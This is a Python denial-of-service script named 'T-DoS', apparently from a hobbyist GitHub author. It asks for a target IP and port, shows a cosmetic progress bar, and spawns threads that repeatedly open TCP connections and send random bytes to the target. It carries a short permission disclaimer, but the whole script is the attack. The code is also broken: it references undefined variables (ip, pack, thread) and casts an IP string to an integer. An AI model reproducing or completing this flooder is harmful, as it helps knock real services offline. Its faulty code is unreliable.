print("\033[91m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
from scapy.all import *
import threading
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet T-DoS")
print("Coded By : ParzivalHack")
print("Github   : github.com/ParzivalHack")
print("Disclaimer: Illecit use of this tool could lead to a violation of federal and local laws.")
print("Use this tool only on your own website or websites from which you have obtained permission.")
print("License: The source code of this tool is under the MIT License.")
print("© 2022 Tommaso Bona")
print("Website IP finder: www.site24x7.com/find-ip-address-of-web-site.html")
print()
target = str(input("Target's IP:"))
port = int(input("Port number (80 or 443 suggested): "))
fake_ip = int(input("Your IP: "))
time.sleep(2)
os.system("clear")
print("\033[91m")
os.system("figlet DoS Attack")
print("Coded by: ParzivalHack")
print ("\033[91m")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(4)
print("[==========          ] 50%")
time.sleep(3)
print("[===============     ] 75%")
time.sleep(2)
print("[====================] 100%")
time.sleep(1)
def start():
    hh = random._urandom(10)
    xx = int(0)
    while True:
        try:
            s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(hh)
            for i in range(pack):
                s.send(hh)
            xx += 1
            print("Attacking "+ip+" | sent: "+str(xx))
        except:
            s.close()
            print("Packet sent")
            time.sleep(1)

for x in range(thread):
    thread = threading.Thread(target=start)
    thread.start()
   
